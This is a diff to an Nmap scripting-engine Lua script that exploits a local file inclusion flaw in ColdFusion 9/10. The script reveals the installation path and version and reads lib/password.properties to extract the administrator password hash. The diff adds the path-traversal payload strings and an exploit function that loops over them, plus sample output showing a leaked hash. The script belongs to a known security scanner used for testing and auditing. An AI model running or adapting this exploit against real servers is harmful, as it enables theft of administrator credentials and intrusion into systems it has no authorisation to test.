@@ -1,13 +1,30 @@
 description = [[
-Coldfusion-subzero exploit.
+Attempts to retrieve the version, installation path and password.properties files in vulnerable ColdFusion 9/10 installations.
+
+This was based on the exploit 'ColdSub-Zero.pyFusion v2'.
 ]]
 
 ---
--- @usage
+-- @usage nmap -sV --script http-coldfusion-subzero <target>
+-- @usage nmap -p80 --script http-coldfusion-subzero --script-args basepath=/cf/ <target>
 -- 
 -- @output
+-- PORT   STATE SERVICE REASON
+-- 80/tcp open  http    syn-ack
+-- | http-coldfusion-subzero: 
+-- |   absolute_path: C:\inetpub\wwwroot\CFIDE\adminapi\customtags
+-- |   version: 9
+-- |   password_properties: #Fri Mar 02 17:03:01 CST 2012
+-- | rdspassword=
+-- | password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0
+-- |_encrypted=true
 --
--- @args
+-- @xmloutput
+-- <script id="http-coldfusion-subzero" output="&#xa;  installation_path: C:\inetpub\wwwroot\CFIDE\adminapi\customtags&#xa;  version: 9&#xa;  password_properties: #Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;"><elem key="installation_path">C:\inetpub\wwwroot\CFIDE\adminapi\customtags</elem>
+-- <elem key="version">9</elem>
+-- <elem key="password_properties">#Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;</elem>
+-- </script>
+-- @args http-coldfusion-subzero.basepath Base path. Default: /.
 --
 ---
 
@@ -18,14 +35,15 @@ categories = {"exploit"}
 local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
+local url = require "url"
 
 portrule = shortport.http
 
-local PATH_PAYLOAD = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
-local IMG_PAYLOAD = "/CFIDE/administrator/images/loginbackground.jpg"
-local LFI_PAYLOAD_FRAG_1 = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
+local PATH_PAYLOAD = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
+local IMG_PAYLOAD = "CFIDE/administrator/images/loginbackground.jpg"
+local LFI_PAYLOAD_FRAG_1 = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
 local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
-local CREDENTIALS_PAYLOAD = {"../../lib/password.properties",
+local CREDENTIALS_PAYLOADS = {"../../lib/password.properties",
                              '..\\..\\lib\\password.properties', 
                              '..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties',
                              "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\cfusion\\lib\\password.properties", 
@@ -69,18 +87,40 @@ local function get_version(host, port, basepath)
       version = 8
     else 
       stdnse.print_debug(1, "%s:Could not determine version.", SCRIPT_NAME)
+      version = nil
     end
   end
   return version
 end
 
+---
+-- Sends malicious payloads to exploit a LFI vulnerability and extract the credentials
+local function exploit(host, port, basepath)
+  for i, vector in ipairs(CREDENTIALS_PAYLOADS) do
+    local req = http.get(host, port, basepath..LFI_PAYLOAD_FRAG_1..vector..LFI_PAYLOAD_FRAG_2)
+      if string.find(req.body, "encrypted=true") then
+        stdnse.print_debug(1, "%s: String pattern found. Exploitation worked with vector '%s'.", SCRIPT_NAME, vector)
+	return true, req.body
+      end
+  end
+end
+
 action = function(host, port)
+  local output_tab = stdnse.output_table()
   local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or "/"
   local installation_path = get_installation_path(host, port, basepath)
-  if not(installation_path) then
-    return nil
+  if installation_path then
+    output_tab.installation_path = url.unescape(installation_path)
+  end
+  
+  local version_num = get_version(host, port, basepath)
+  if version_num then
+    output_tab.version = version_num
   end
 
-  local version_num = get_version(host, port, basepath)
-
+  local status, file = exploit(host, port, basepath)
+  if status then
+     output_tab.password_properties = file
+  end
+  return output_tab
 end
